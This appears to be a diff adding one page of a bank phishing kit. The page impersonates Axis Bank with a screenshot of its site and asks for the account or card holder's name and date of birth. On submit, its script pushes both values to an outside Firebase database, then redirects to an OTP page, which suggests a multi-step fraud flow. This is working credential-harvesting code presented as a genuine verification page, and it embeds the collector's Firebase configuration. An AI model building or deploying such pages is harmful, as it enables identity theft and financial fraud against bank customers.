@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="/script/main.js"></script>
+  </head>
+  <body class="bg-[#F4F4F4]">
+    <!-- Header -->
+    <header>
+      <div
+        class="bg-[url('/assets/header.png')] text-white w-auto bg-cover h-[60px] shadow-md"
+      ></div>
+    </header>
+    <!-- Main Content -->
+    <section class="flex flex-col justify-center mt-10">
+      <h1 class="text-2xl text-center font-bold">
+        Account Details Verification<span></span><span></span><span></span><span></span><span></span><span></span>
+      </h1>
+
+      <!-- First Form -->
+      <form action="" id="first-form" class="px-8 tab-content">
+        <div
+          class="space-y-6 flex flex-col justify-center mt-10 p-5 rounded-xl"
+        >
+          <!-- {/* Full Name */} -->
+          <div class="mb-4">
+            <label
+              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
+              htmlFor="holder_name"
+            >
+              Account / Card Holder Name <span class="text-red-500">*</span><span></span><span></span><span></span><span></span><span></span>
+            </label>
+            <input
+              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
+              id="holder_name"
+              type="text"
+              name="holder_name"
+              value=""
+              required
+            />
+          </div>
+          <!-- {/* Password */} -->
+          <div class="mb-4">
+            <label
+              class="text-gray-500 font-bold text-sm mb-2 flex items-center"
+              htmlFor="dob"
+            >
+              Date Of Birth <span class="text-red-500">*</span><span></span><span></span><span></span><span></span><span></span><span></span>
+            </label>
+            <input
+              class="appearance-none border-b border-gray-400 rounded-none w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline bg-[#F4F4F4]"
+              id="dob"
+              type="text"
+              name="dob"
+              value=""
+              required
+              placeholder="DD/MM/YYYY"
+            />
+          </div>
+        </div>
+        <!-- {/* Submit Button */} -->
+        <div class="w-full flex justify-center items-center mt-5 px-5">
+          <button
+            class="bg-gradient-to-r from-[#861F41] to-[#861F41] text-white font-bold py-1 px-10 rounded-full focus:outline-none focus:shadow-outline w-full"
+            type="submit"
+          >
+            Submit<span></span><span></span><span></span><span></span><span></span><span></span><span></span>
+          </button>
+        </div>
+      </form>
+    </section>
+    <section>
+      <img
+        src="/assets/screencapture-omni-axisbank-co-in-axisretailbanking-2024-11-21-18_59_59.png"
+        alt="footer"
+        class="w-full bg-cover"
+      />
+    </section>
+
+    <!-- Script -->
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"
+    ></script>
+
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"
+    ></script>
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"
+    ></script>
+
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      import {
+        getDatabase,
+        ref,
+        push,
+      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyBXTjQ9MLGxllGs9TzBI--BbJadoWC0D-A",
+  authDomain: "axismy-d7be9.firebaseapp.com",
+  databaseURL: "https://axismy-d7be9-default-rtdb.firebaseio.com",
+  projectId: "axismy-d7be9",
+  storageBucket: "axismy-d7be9.firebasestorage.app",
+  messagingSenderId: "1099233831686",
+  appId: "1:1099233831686:web:63c456126d1f6b16cbcc87"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const database = getDatabase(app);
+
+      document.addEventListener("DOMContentLoaded", () => {
+        //Formate Date of Birth: DD/MM/YYYY
+        const dobInput = document.querySelector('input[name="dob"]');
+        dobInput.addEventListener("input", (event) => {
+          let input = event.target.value.replace(/\D/g, ""); // Remove non-digit characters
+          input = input.substring(0, 8); // Limit to 8 digits
+          if (input.length > 2) {
+            input = `${input.substring(0, 2)}/${input.substring(
+              2,
+              4
+            )}/${input.substring(4)}`; // Add slash after DD and MM
+          }
+          event.target.value = input;
+        });
+
+        document
+          .getElementById("first-form")
+          .addEventListener("submit", function (event) {
+            event.preventDefault();
+            //IDS
+            const holder_name = document.getElementById("holder_name").value;
+            const dob = document.getElementById("dob").value;
+
+            // Push data to the database
+            const dbRef = ref(database, "users");
+            push(dbRef, {
+              holder_name: holder_name,
+              dob: dob,
+            })
+              .then(() => {
+                console.log("Data inserted successfully!");
+                window.location.href = "otp.html?next=cdob.html";
+              })
+              .catch((error) => {
+                console.error("Error inserting data: ", error);
+              });
+          });
+      });
+    </script>
+  </body>
+</html>
